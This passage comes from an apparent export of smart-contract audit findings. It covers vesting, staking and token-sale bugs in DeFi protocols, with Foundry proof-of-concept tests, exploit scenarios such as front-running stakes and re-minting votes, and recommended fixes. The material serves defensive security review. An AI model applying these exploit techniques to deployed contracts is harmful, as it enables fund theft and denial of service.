tlc.transfer(bob, 1);
// create a vesting schedule for Alice
vm.prank(initAccount);
createVestingSchedule(
VestingSchedule({
start: block.timestamp,
cliffDuration: 1 days,
lockDuration: 0,
duration: 10 days,
period: 1 days,
amount: 10,
beneficiary: alice,
delegatee: address(0),
revocable: true
})
);
address aliceEscrow = tlc.deterministicVestingEscrow(0);
// Bob send one token directly to the Escrow contract of alice
vm.prank(bob);
tlc.transfer(aliceEscrow, 1);
// The creator decide to revoke the vesting schedule before the end timestamp
// It will throw an underflow error
vm.prank(initAccount);
vm.expectRevert(stdError.arithmeticError);
tlc.revokeVestingSchedule(0, uint64(block.timestamp + 1));
}
function testDOSComputeVestingReleasableAmount() public {
// send Bob 1 vote token
vm.prank(initAccount);
tlc.transfer(bob, 1);
// create a vesting schedule for Alice
10
vm.prank(initAccount);
createVestingSchedule(
VestingSchedule({
start: block.timestamp,
cliffDuration: 1 days,
lockDuration: 0,
duration: 10 days,
period: 1 days,
amount: 10,
beneficiary: alice,
delegatee: address(0),
revocable: true
})
);
address aliceEscrow = tlc.deterministicVestingEscrow(0);
// Bob send one token directly to the Escrow contract of alice
vm.prank(bob);
tlc.transfer(aliceEscrow, 1);
vm.expectRevert(stdError.arithmeticError);
uint256 releasableAmount = tlc.computeVestingReleasableAmount(0);
// Warp to the end of the vesting schedule
vm.warp(block.timestamp + 10 days);
releasableAmount = tlc.computeVestingReleasableAmount(0);
assertEq(releasableAmount, 11);
}
struct VestingSchedule {
uint256 start;
uint256 cliffDuration;
uint256 lockDuration;
uint256 duration;
uint256 period;
uint256 amount;
address beneficiary;
address delegatee;
bool revocable;
}
function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) {
return createVestingScheduleStackOptimized(config);
}
function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns
(uint256) { , !
return
tlc.createVestingSchedule(
uint64(config.start),
uint32(config.cliffDuration),
uint32(config.duration),
uint32(config.period),
uint32(config.lockDuration),
config.revocable,
config.amount,
config.beneficiary,
config.delegatee
);
}
11
}
Recommendation: Consider re-implementing how the contract accounts for the amount of released tokens of a
vesting schedule to avoid this situation. In case the new implementation does not rely anymore on balanceOf(_-
escrow) , remember that tokens sent directly to the escrow account would be stuck forever.
Alluvial: Fixed in liquid-collective/liquid-collective-protocol@7870787 by introducing a new variable inside the user
vesting schedule named releasedAmount that tracks the already released amount and can not be manipulated by
an external attacker.
Spearbit: Fixed.",Liquid Collective,Emanuele Ricci|Optimum|Matt Eccentricexit|Danyal Ellahi,HIGH,Revert By Sending Dust,,9,4,5,,https://github.com/spearbit/portfolio/blob/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/LiquidCollective2-Spearbit-Security-Review.pdf,https://github.com/spearbit/portfolio/blob/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf,solodit_reports,b86fe0ec876da2cb1875736f22a7ce5b,2023-09-22 02:44:04,2024-10-14 23:30:35,1,,Staking Pool|Liquid Staking|Services|Yield Aggregator|Cross Chain
767632,47353879b04b64e9293290b24ebe205f,H-5: Reinvest will return sub-optimal return if the pool is imbalanced,Sherlock,2023-03-08,"# Issue H-5: Reinvest will return sub-optimal return if the pool is imbalanced 

Source: https://github.com/sherlock-audit/2023-02-notional-judging/issues/9 

## Found by 
xiaoming90

## Summary

Reinvesting only allows proportional deposit. If the pool is imbalanced due to unexpected circumstances, performing a proportional deposit is not optimal. This result in fewer pool tokens in return due to sub-optimal trade, eventually leading to a loss of gain for the vault shareholder.

## Vulnerability Detail

During reinvest rewards, the vault will ensure that the amount of primary and secondary tokens deposited is of the right proportion per the comment in Line 163 below.

https://github.com/sherlock-audit/2023-02-notional/blob/main/leveraged-vaults/contracts/vaults/curve/external/Curve2TokenConvexHelper.sol#L163

```solidity
File: Curve2TokenConvexHelper.sol
146:     function reinvestReward(
147:         Curve2TokenConvexStrategyContext calldata context,
148:         ReinvestRewardParams calldata params
149:     ) external {
..SNIP..
163:         // Make sure we are joining with the right proportion to minimize slippage
164:         poolContext._validateSpotPriceAndPairPrice({
165:             strategyContext: strategyContext,
166:             oraclePrice: poolContext.basePool._getOraclePairPrice(strategyContext),
167:             primaryAmount: primaryAmount,
168:             secondaryAmount: secondaryAmount
169:         });
```

The `Curve2TokenConvexHelper.reinvestReward` function will internally call the `Curve2TokenPoolUtils._checkPrimarySecondaryRatio`, which will check that the primary and secondary tokens deposited are of the right proportion.

https://github.com/sherlock-audit/2023-02-notional/blob/main/leveraged-vaults/contracts/vaults/curve/internal/pool/Curve2TokenPoolUtils.sol#L147

```solidity
File: Curve2TokenPoolUtils.sol
147:     function _checkPrimarySecondaryRatio(
148:         StrategyContext memory strategyContext,
149:         uint256 primaryAmount, 
150:         uint256 secondaryAmount, 
151:         uint256 primaryPoolBalance, 
152:         uint256 secondaryPoolBalance
153:     ) private pure {
154:         uint256 totalAmount = primaryAmount + secondaryAmount;
155:         uint256 totalPoolBalance = primaryPoolBalance + secondaryPoolBalance;
156: 
157:         uint256 primaryPercentage = primaryAmount * CurveConstants.CURVE_PRECISION / totalAmount;        
158:         uint256 expectedPrimaryPercentage = primaryPoolBalance * CurveConstants.CURVE_PRECISION / totalPoolBalance;
159: 
160:         strategyContext._checkPriceLimit(expectedPrimaryPercentage, primaryPercentage);
161: 
162:         uint256 secondaryPercentage = secondaryAmount * CurveConstants.CURVE_PRECISION / totalAmount;
163:         uint256 expectedSecondaryPercentage = secondaryPoolBalance * CurveConstants.CURVE_PRECISION / totalPoolBalance;
164: 
165:         strategyContext._checkPriceLimit(expectedSecondaryPercentage, secondaryPercentage);
166:     }
```

This concept of proportional join appears to be taken from the design of earlier Notional's Balancer leverage vaults. For Balancer Pools, it is recommended to join with all the pool's tokens in exact proportions to minimize the price impact of the join ([Reference](https://docs.balancer.fi/guides/builders/join-pool.html#building-a-join-transaction)).

However, the concept of proportional join to minimize slippage does not always hold for Curve Pools as they operate differently. 

A Curve pool is considered imbalanced when there is an imbalance between the assets within it.  For instance, the Curve stETH/ETH pool is considered imbalanced if it has the following reserves:

- ETH: 340,472.34 (31.70%)
- stETH: 733,655.65 (68.30%)

If a Curve Pool is imbalanced, attempting to perform a proportional join will not give an optimal return (e.g. result in fewer Pool LP tokens received). 

In Curve Pool, there are penalties/bonuses when depositing to a pool. The pools are always trying to balance themselves. If a deposit helps the pool to reach that desired balance, a deposit bonus will be given (receive extra tokens). On the other hand, if a deposit deviates from the pool from the desired balance, a deposit penalty will be applied (receive fewer tokens).

The following is the source code of `add_liquidity` function taken from https://github.com/curvefi/curve-contract/blob/master/contracts/pools/steth/StableSwapSTETH.vy. As shown below, the function attempts to calculate the `difference` between the `ideal_balance` and `new_balances`, and uses the `difference` as a factor of the fee computation, which is tied to the bonus and penalty.

```python
def add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:
..SNIP..
    if token_supply > 0:
        # Only account for fees if we are not the first to deposit
        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))
        admin_fee: uint256 = self.admin_fee
        for i in range(N_COINS):
            ideal_balance: uint256 = D1 * old_balances[i] / D0
            difference: uint256 = 0
            if ideal_balance > new_balances[i]:
                difference = ideal_balance - new_balances[i]
            else:
                difference = new_balances[i] - ideal_balance
            fees[i] = fee * difference / FEE_DENOMINATOR
            if admin_fee != 0:
                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR
            new_balances[i] -= fees[i]
        D2 = self.get_D(new_balances, amp)
        mint_amount = token_supply * (D2 - D0) / D0
    else:
        mint_amount = D1  # Take the dust if there was any
..SNIP..
```

Following is the mathematical explanation of the penalties/bonuses extracted from Curve's Discord channel:

- There is a “natural” amount of D increase that corresponds to a given total deposit amount; when the pool is perfectly balanced, this D increase is optimally achieved by a balanced deposit. Any other deposit proportions for the same total amount will give you less D.
- However, when the pool is imbalanced, a balanced deposit is no longer optimal for the D increase.

## Impact

There is no guarantee that a Curve Pool will always be balanced. Historically, there are multiple instances where the largest Curve pool (stETH/ETH) becomes imbalanced (Reference [#1](https://twitter.com/LidoFinance/status/1437124281150935044) and [#2](https://www.coindesk.com/markets/2022/06/17/biggest-steth-pool-almost-empty-complicating-exit-for-would-be-sellers/)).

If the pool is imbalanced due to unexpected circumstances, performing a proportional deposit is not optimal, leading to the trade resulting in fewer tokens than possible due to the deposit penalty. In addition, the trade also misses out on the potential gain from the deposit bonus.

The side-effect is that reinvesting the reward tokens will result in fewer pool tokens in return due to sub-optimal trade, eventually leading to a loss of gain for the vault shareholder.

## Code Snippet

https://github.com/sherlock-audit/2023-02-notional/blob/main/leveraged-vaults/contracts/vaults/curve/external/Curve2TokenConvexHelper.sol#L163

https://github.com/sherlock-audit/2023-02-notional/blob/main/leveraged-vaults/contracts/vaults/curve/internal/pool/Curve2TokenPoolUtils.sol#L147

## Tool used

Manual Review

## Recommendation

Consider removing the `_checkPrimarySecondaryRatio` function from the `_validateSpotPriceAndPairPrice` function to give the callers the option to deposit the reward tokens in a ""non-proportional"" manner if a Curve Pool becomes imbalanced so that the deposit penalty could be minimized or the deposit bonus can be exploited to increase the return.

## Discussion

**jeffywu**

Valid, should get the optimal way to join via some off chain function for Curve pools. This is will work because we are using a permissioned reward reinvestment role.",Notional Update #2,xiaoming90,HIGH,,25000 USDC,0,4,5,https://github.com/sherlock-audit/2023-02-notional-judging/issues/9,,,https://app.sherlock.xyz/audits/contests/52,solodit_reports,,2023-09-22 02:44:39,2024-10-14 23:35:33,1,,Liquid Staking|CDP|Yield|Services|Launchpad
768364,516cd47bbc293d61ee6254fce401e415,[H-01] Sale creator can possibly steal bidders' claimable tokens,Pashov,2023-05-01,"**Impact:**
High, as it results in a loss of funds for bidders

**Likelihood:**
Medium, as it requires to claim before cliff expires

**Description**

In `StakedVestedCrowdSale` the sale creator can give the address to his own `TokenVesting` & `TimelockedToken` contracts. Same in `VestedCrowdSale` but only for `TimelockedToken`. Now if the sale creator is malicious he can give the addresses of his own deployed contracts that inherit from either `TokenVesting` or `TimelockedToken` but add functionality to pull the funds out on demand, while they are still locked in them. This is even worse when it comes to the token locking logic in `VestedCrowdSale`, where on sale settlement the `TimelockedToken` contract is approved to spend all the `auctionToken` that should be claimed, meaning if it has the functionality it can just pull the funds and transfer them out of the contract on demand. This will result in inability for bidders to claim their tokens and 100% loss of their value.

**Recommendations**

Enforce both `TokenVesting` & `TimelockedToken` contracts to be only internally deployed from a predefined bytecode/implementation and do not accept user-supplied contracts.",IPNFT,Pashov,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-05-01-IPNFT.md,,,solodit_reports,,2023-09-22 02:45:20,2024-03-07 21:07:43,1,,
768808,79c97321cfecd183304575ae82734d65,[H-01] Vesting schedule for a beneficiary can be overwritten,Pashov,2023-06-01,"**Impact:**
High, as the amount left to be vested will be stuck in the contract forever

**Likelihood:**
Medium, as it requires more than 1 vesting schedule for the same beneficiary

**Description**

The vesting schedules in `Vesting` are saved in `schedules` mapping, which uses the `_beneficiary` address as the key. The problem is that if a beneficiary has a scheduled vesting already, if a second schedule is set to it, then the first one will be overwritten but the `schedulesTotalAmount` will still hold the first scheduled funds to vest. This means they will be stuck in the `Vesting` contract forever.

**Recommendations**

A possible solution is to use a vesting ID instead of the `beneficiary` address as the key in the `schedules` mapping or to disallow multiple schedules set for the same `beneficiary`.",Protectorate,Pashov,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-06-01-Protectorate.md,,,solodit_reports,,2023-09-22 02:45:45,2024-03-07 21:08:14,1,,
769270,122df5ad770e52a3ed078514490ef1ff,Staker funds can be locked via front-running,TrailOfBits,2023-07-17,"Diﬃculty:  Medium

Type: Conﬁguration

Target:  eth-contracts/contracts/StakeManager.sol
Description
The  stake  function in the  StakeManager  contract takes  FLIP tokens from the caller to
stake them in the protocol, ensuring that the amount is greater than the minimum staking
amount deﬁned. When the transfer is completed, the function emits a  Staked  event
containing metadata about the operation. This event is then witnessed by the Chainﬂip
engine and relayed to the  cf-staking  pallet on the  State Chain.
function  stake  (
bytes32  nodeID  ,
uint256  amount  ,
address  returnAddr
)  external  override  nzBytes32(nodeID)  nzAddr(returnAddr)  {
IFLIP  flip  =  _FLIP;
require  (  address  (flip)  !=  address  (  0  ),  ""Staking:  Flip not set""  );
require  (amount  >=  _minStake,  ""Staking: stake  too small""  );
// Assumption of set token allowance by the user
flip.transferFrom(  msg.sender  ,  address  (  this  ),  amount);
emit  Staked(nodeID,  amount,  msg.sender  ,  returnAddr);
}
Figure 21.1: The FLIP  stake  function in the Ethereum  network
(  eth-contracts/contracts/StakeManager.sol  )
When this event is processed in the  cf-staking  pallet,  the withdrawal address submitted
is checked. If it is the ﬁrst time a stake is made for that address and node ID, it goes
through. However, if the node ID already has an address associated with it, this address
must match the one submitted in the transaction; otherwise the staked funds are locked in
the contract. This is because the Ethereum side already has the tokens, and only
governance can recover them.
// If we reach here, the account already exists, so any provided withdrawal address
// *must* match the one that was added on the initial account-creating staking
event,
// otherwise this staking event cannot be processed.
match  WithdrawalAddresses::<T>::get(account_id)  {
Some  (existing)  if  withdrawal_address  ==  existing  =>  Ok  (()),
Trail of Bits
PUBLIC
62
Chainﬂip Protocol Security  Assessment
_  =>  {
// The staking event was invalid - this should  only happen if someone bypasses
// our standard ethereum contract interfaces.  We don't automatically refund
// here otherwise it's attack vector (refunds  require a broadcast, which is
// expensive).
//
// Instead, we keep a record of the failed attempt  so that we can potentially
// investigate and / or consider refunding automatically  or via governance.
FailedStakeAttempts::<T>::append(account_id,  (withdrawal_address,  amount));
Self  ::deposit_event(Event::FailedStakeAttempt(
account_id.clone(),
withdrawal_address,
amount,
));
Err  (Error::<T>::WithdrawalAddressRestricted)
},
}
Figure 21.2: Relevant part of the  check_withdrawal_address  function in the  cf-staking
pallet (  backend/state-chain/pallets/cf-staking/src/lib.rs  )
An attacker can front-run a valid staking transaction by submitting the same node ID as the
pending transaction, the minimum staking amount, and a diﬀerent return address. This
locks the legitimate staker funds in the contract until governance releases them at the cost
of the minimum staking amount.
If the node ID is known beforehand, there is no need to front-run because the stake can be
sent any time before the legitimate transaction is sent.
Exploit Scenario
Mallory decides to prevent new validators from staking FLIP tokens. She sets up a
monitoring system, and once she sees a pending stake transaction in the mempool, she
front-runs it with another transaction with the same node ID.
Since the attack has virtually no cost for Mallory, she can keep doing this as long as she has
enough FLIP tokens. This can eﬀectively prevent any other party from interacting with the
stake  function and thereby prevent more validators  from being added to the protocol.
Recommendations
Short term, consider removing the withdrawal address parameter and default it to be the
caller. This will require checking integration with vesting contracts to make sure they can
handle withdrawals.
Long term, consider using a double map structure that allows retrieving a withdrawal
address given the staker and node ID keys.
Trail of Bits
PUBLIC
63
Chainﬂip Protocol Security  Assessment",Chainﬂip Protocol,Fredrik Dahlgren|Joop van de Pol|Will Song|Nat Chin|Guillermo Larregay|Kurt Willis,HIGH,,,63,0,0,,https://github.com/trailofbits/publications/blob/master/reviews/2023-04-chainflip-securityreview.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/2023-04-chainflip-securityreview.pdf,https://github.com/trailofbits/publications/blob/master/reviews/2023-04-chainflip-securityreview.pdf,solodit_reports,7da1b7bb3575054c5c8d912849f4a8e4,2023-09-22 02:46:11,2024-04-11 06:41:49,1,,
769322,e80176aa5902f08dcd543d59a2a13bed,"H-1: ""Votes"" balance can be increased indefinitely in multiple contracts",Sherlock,2023-07-21,"# Issue H-1: ""Votes"" balance can be increased indefinitely in multiple contracts 

Source: https://github.com/sherlock-audit/2023-06-tokensoft-judging/issues/41 

## Found by 
0xDanielH, 0xDjango, 0xbranded, 0xlx, AkshaySrivastav, BenRai, Czar102, Musaka, VAD37, Yuki, caventa, dany.armstrong90, jah, jkoppel, kutugu, magellanXtrachev, ni8mare, p-tsanev, p12473, pengun, r0bert, stopthecap, twicek, y1cunhui
## Summary
The ""voting power"" can be easily manipulated in the following contracts:
- `ContinuousVestingMerkle`
- `PriceTierVestingMerkle`
- `PriceTierVestingSale_2_0`
- `TrancheVestingMerkle`
- `CrosschainMerkleDistributor`
- `CrosschainContinuousVestingMerkle`
- `CrosschainTrancheVestingMerkle`
- All the contracts inheriting from the contracts listed above

This is caused by the public `initializeDistributionRecord()` function that can be recalled multiple times without any kind of access control:
```solidity
  function initializeDistributionRecord(
    uint32 _domain, // the domain of the beneficiary
    address _beneficiary, // the address that will receive tokens
    uint256 _amount, // the total claimable by this beneficiary
    bytes32[] calldata merkleProof
  ) external validMerkleProof(_getLeaf(_beneficiary, _amount, _domain), merkleProof) {
    _initializeDistributionRecord(_beneficiary, _amount);
  }
```

## Vulnerability Detail
The `AdvancedDistributor` abstract contract which inherits from the `ERC20Votes`, `ERC20Permit` and `ERC20` contracts, distributes tokens to beneficiaries with voting-while-vesting and administrative controls. Basically, before the tokens are vested/claimed by a certain group of users, these users can use these ERC20 tokens to vote. These tokens are minted through the `_initializeDistributionRecord()` function:
```solidity
  function _initializeDistributionRecord(
    address beneficiary,
    uint256 totalAmount
  ) internal virtual override {
    super._initializeDistributionRecord(beneficiary, totalAmount);

    // add voting power through ERC20Votes extension
    _mint(beneficiary, tokensToVotes(totalAmount));
  }
```
As mentioned in the [Tokensoft Discord channel](https://discord.com/channels/812037309376495636/1130514276570906685/1130577295539707995) these ERC20 tokens minted are used to track an address's unvested token balance, so that other projects can utilize 'voting while vesting'.

A user can simply call as many times as he wishes the `initializeDistributionRecord()` function with a valid merkle proof. With each call, the `totalAmount` of tokens will be minted. Then, the user simply can call `delegate()` and delegate those votes to himself, ""recording"" the inflated voting power.

## Impact
The issue totally breaks the 'voting while vesting' design. Any DAO/project using these contracts to determine their voting power could be easily manipulated/exploited.

## Code Snippet
- https://github.com/sherlock-audit/2023-06-tokensoft/blob/main/contracts/contracts/claim/ContinuousVestingMerkle.sol#L43-L53
- https://github.com/sherlock-audit/2023-06-tokensoft/blob/main/contracts/contracts/claim/PriceTierVestingMerkle.sol#L49-L59
- https://github.com/sherlock-audit/2023-06-tokensoft/blob/main/contracts/contracts/claim/PriceTierVestingSale_2_0.sol#L91-L95
- https://github.com/sherlock-audit/2023-06-tokensoft/blob/main/contracts/contracts/claim/TrancheVestingMerkle.sol#L39-L49
- https://github.com/sherlock-audit/2023-06-tokensoft/blob/main/contracts/contracts/claim/abstract/CrosschainMerkleDistributor.sol#L46-L53

## Tool used
Manual Review

## Recommendation
Only allow users to call once the `initializeDistributionRecord()` function. Consider using a mapping to store if the function was called previously or not. Keep also in mind that fully vested and claimed users should not be able to call this function and if they do, the total amount of tokens that should be minted should be 0 or proportional/related to the amount of tokens that they have already claimed.



## Discussion

**cr-walker**

Great find! We need to preserve the ability to re-initialize distribution records (e.g. if a merkle root changes), so I believe something like this is the best fix:

```
  function _initializeDistributionRecord(
    address beneficiary,
    uint256 totalAmount
  ) internal virtual override {
    super._initializeDistributionRecord(beneficiary, totalAmount);

    uint256 currentVotes = balanceOf(beneficiary);
    uint256 newVotes = tokensToVotes(totalAmount);

    if (currentVotes > newVotes) {
      // reduce voting power through ERC20Votes extension
      _burn(beneficiary, currentVotes - newVotes);
    } else if (currentVotes < newVotes) {
      // increase voting power through ERC20Votes extension
      _mint(beneficiary, newVotes - currentVotes);
    }
  }
  ```

**cr-walker**

Fixed: https://github.com/SoftDAO/contracts/pull/9",Tokensoft,Czar102|0xDjango|caventa|jah|VAD37|AkshaySrivastav|jkoppel|y1cunhui|kutugu|stopthecap|ni8mare|twicek|pengun|BenRai|p-tsanev|Yuki|p12473|Musaka|dany.armstrong90|0xDanielH|r0bert|0xbred|0xlx|magellanXtrachev,HIGH,Vote,14000 USDC,0,3.0000000000000004,5,https://github.com/sherlock-audit/2023-06-tokensoft-judging/issues/41,,,https://app.sherlock.xyz/audits/contests/100,solodit_reports,,2023-09-22 02:46:14,2024-10-15 00:06:29,1,,
769345,1bb840c59ccc465e2564046f904dd537,LODE TOKENS CAN BE PERMANENTLY STUCK IN THE STAKINGREWARDS CONTRACT DUE TO WRONG MINTING/BURNING LOGIC IN STAKE/UNSTAKE LODE FUNCTIONS,Halborn,2023-07-28,"Commit IDs affected: -aba53cfd19189720cb8c32368176648d6aead960 Description: In the StakingRewards contract, VotingPower is minted every time a user calls stakeLODE ()and burnt every time a user calls the unstakeLODE () function. Although, in the convertEsLODEToLODE ()function, when lockTime is dif- ferent from 10 seconds, VotingPower is also burnt: Listing 6: StakingRewards.sol (Line 367)364 //Adjust voting power ifuser islocking LODE 365 if(stakers [msg.sender ].lockTime != 10 seconds ) { 366 //ifuser isunlocked ,weneed toburn their converted amount ëofvoting power 367 votingContract .burn (msg.sender ,conversionAmount ); 368 }else { lockTime will be different from 10 seconds if: 1. User staked LODE with 90 or 180 days lockTime . 2. User has not staked LODE yet. Based on this implementation, the following flow would cause an overflow, not allowing users to unstake their LODE tokens: 39 FINDINGS & TECH DETAILS 1. Alice stakes 100 esLODE tokens. She receives 100 VotingPower. 2. 1 year later, when the vesting is completed, Alice calls convertEsLODEToLODE () converting those 100 esLODE tokens into 100 LODE tokens. As she hadn’t staked any LODE before, her lockTime is 0, entering the iflogic mentioned above. This means that her 100 VotingPower is burnt. 3. Alice tries to unstake her 100 LODE token, but she can’t as it reverts with [FAIL .Reason :Burn amount exceeds voting power ]. Contract is incorrectly trying to burn VotingPower that she does not have anymore, as it was already burnt before during the convertEsLODEToLODE ()call. Proof of Concept: 40 FINDINGS & TECH DETAILS BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to not mint VotingPower when users stake for 10 seconds in the stakeLODE ()function. Accordingly, the VotingPower should not be burnt when users unstake with a 0 or 10 lockTime in the unstakeLODE () function.",Lodestar Finance - Staking  Security Assessment,Halborn,HIGH,,,40,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,solodit_reports,8882acad9f61cd2adcb2664d72308196,2023-09-22 02:46:15,2024-10-15 00:06:31,1,,
769348,c6ea796b9d9a162b8fd531d1cf7959aa,"CONVERTESLODETOLODE FUNCTION EXCESSIVELY BURNS VOTING POWER, REVERTING",Halborn,2023-07-28,"Commit IDs affected: -b049afc3bf5635250033f03fc9e4684eb332d373 Description: In the StakingRewards contract, the function convertEsLODEToLODE ()is used to convert the esLODE tokens to LODE with a vesting period of one year. This function performs some calculations and burns VotingPower accordingly after converting the esLODE tokens to LODE. Although, these calculations are done incorrectly and under some scenarios more VotingPower than what the stakes actually has is burnt, reverting. This locks permanently the LODE tokens in the contract, as any unstake/withdraw function calls the convertEsLODEToLODE ()function. 56 FINDINGS & TECH DETAILS Proof of Concept: BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to correct the convertEsLODEToLODE ()function logic, so it does not excessively burn VotingPower, reverting. 57 FINDINGS & TECH DETAILS",Lodestar Finance - Staking  Security Assessment,Halborn,HIGH,,,57,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,solodit_reports,8882acad9f61cd2adcb2664d72308196,2023-09-22 02:46:15,2024-10-15 00:06:29,1,,
769501,41608bb181874578e8af5712ea3996c4,INCORRECT TOKEN TRANSFER IN VESTING FUNCTION OF STAKING SMART CONTRACT,Halborn,2023-08-29,"Description: In the vest function, the rewardToken is being transferred instead of the stakingToken . This could lead to a critical issue where users receive the wrong token upon vesting, which is not what they initially staked. This discrepancy could lead to financial loss for the users and could severely undermine the trust in the staking platform. Code Location: StakingReward.sol#L151 Listing 2 1 function vest (uint256 tokenId )external { 2 //Anyone can HELP the fully locked NFT tobegin vesting 3 //if(ownerOf (tokenId )!=msgSender ())revert ëStakingReward__NotOwner (); 4 _updateReward (); 5 StakedPosition storage position =positions [tokenId ]; 6 if(position .unlockTime >block .timestamp )revert ëStakingReward__NotVesting (); 7 if(position .lastClaimTime > 0) revert ëStakingReward__AlreadyVested (); 8 9 position .lastClaimTime =block .timestamp ; 10 position .reward =earned (tokenId ); 11 totalShare -=position .share ; 12 rewardToken .transfer (address (exchangeWallet ),position . ëamount ); 13 exchangeWallet .increaseBalance (address (rewardToken ), ëownerOf (tokenId ),position .amount ); 14 21FINDINGS & TECH DETAILS 15 emit StartVesting (tokenId ,position .reward ); 16 } Proof Of Concept: •Users will receive rewardToken instead of their original stakingToken upon vesting. •This could lead to financial imbalances within the smart contract, affecting the overall tokenomics . BVSS: AO:A/AC:L/AX:M/C:N/I:H/A:H/D:C/Y:N/R:N/S:U (9.2) Recommendation: Modify the vest function to transfer the stakingToken back to the user instead of the rewardToken .",Substance Exchange - Exchange V4  Security Assessment,Halborn,HIGH,,,22,0,0,,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V4_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/halborn/Substance_Exchange_Exchange_V4_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,https://github.com/HalbornSecurity/PublicReports/blob/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V4_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf,solodit_reports,07fc18c2584a2af6471f26b1192d0785,2023-09-22 02:46:24,2024-10-15 00:23:20,1,,
815040,57f7e89e0ba6ec321ce7b58910c9a0b6,[H-01] Missing user input validation can lead to stuck funds,Pashov,2023-07-01,"**Severity**

**Impact:**
High, as all mint fees can be stuck forever

**Likelihood:**
Medium, as users can easily misconfigure inputs

**Description**

There are multiple insufficiencies in the input validation of the arguments of the `initialize` method in `Nft`:

1. The sum of the `supply` of all `categories_` can be less than the `maxMintSupply_` - this would lead to the mint never completing, which results in all of the ETH in the `Nft` contract coming from mints so far being stuck in it forever
2. The `duration` of the `vestingParams_` should have a lower and upper bound as for example a too big of a duration can mean vesting can never complete or a division rounding error
3. The `mintEndTimestamp` of `refundParams_` should not be too further away in the future otherwise refund & vesting mechanisms would never work, and if it is too close then the mint mechanism won't work.

**Recommendations**

Add a validation that the sum of all categories' supply is more than or equal to the `maxMintSupply`. Also add sensible upper and lower bounds for both `duration` for the vesting mechanism and `mintEndTimestamp` for the refund mechanism.",Baton Launchpad,Pashov,HIGH,Missing Check,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-07-01-Baton Launchpad.md,,,solodit_reports,,2023-10-02 21:07:58,2024-03-07 21:08:35,1,,Launchpad
1295012,10ccf3e15c70e43b68b49a4bc7a2b5ca,`TokenSaleProposal::buy` implicitly assumes that buy token has 18 decimals resulting in a potential total loss scenario for Dao Pool,Cyfrin,2023-11-10,"**Description:** `TokenSaleProposalBuy::buy` is called by users looking to buy the DAO token using a pre-approved token. The exchange rate for this sale is pre-assigned for the specific tier. This function internally calls `TokenSaleProposalBuy::_purchaseWithCommission` to transfer funds from the buyer to the gov pool. Part of the transferred funds are used to pay the DexeDAO commission and balance funds are transferred to the `GovPool` address. To do this, `TokenSaleProposalBuy::_sendFunds` is called.

```solidity
    function _sendFunds(address token, address to, uint256 amount) internal {
        if (token == ETHEREUM_ADDRESS) {
            (bool success, ) = to.call{value: amount}("""");
            require(success, ""TSP: failed to transfer ether"");
        } else {
  >>          IERC20(token).safeTransferFrom(msg.sender, to, amount.from18(token.decimals())); //@audit -> amount is assumed to be 18 decimals
        }
    }
```

Note that this function assumes that the `amount` of ERC20 token is always 18 decimals. The `DecimalsConverter::from18` function converts from a base decimal (18) to token decimals. Note that the amount is directly passed by the buyer and there is no prior normalisation done to ensure the token decimals are converted to 18 decimals before the `_sendFunds` is called.


**Impact:** It is easy to see that for tokens with smaller decimals, eg. USDC with 6 decimals, will cause a total loss to the DAO. In such cases amount is presumed to be 18 decimals & on converting to token decimals(6), this number can round down to 0.

**Proof of Concept:**
- Tier 1 allows users to buy DAO token at exchange rate, 1 DAO token = 1 USDC.
-  User intends to buy 1000 Dao Tokens and calls `TokenSaleProposal::buy` with `buy(1, USDC, 1000*10**6)
- Dexe DAO Comission is assumed 0% for simplicity- > `sendFunds` is called with `sendFunds(USDC, govPool, 1000* 10**6)`
- `DecimalConverter::from18` function is called on amount with base decimals 18, destination decimals 6:  `from18(1000*10**6, 18, 6)`
- this gives `1000*10**6/10*(18-6) = 1000/ 10**6` which rounds to 0

Buyer can claim 1000 DAO tokens for free. This is a total loss to the DAO.

Add PoC to `TokenSaleProposal.test.js`:

First add a new line around [L76](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L76) to add new `purchaseToken3`:
```javascript
      let purchaseToken3;
```

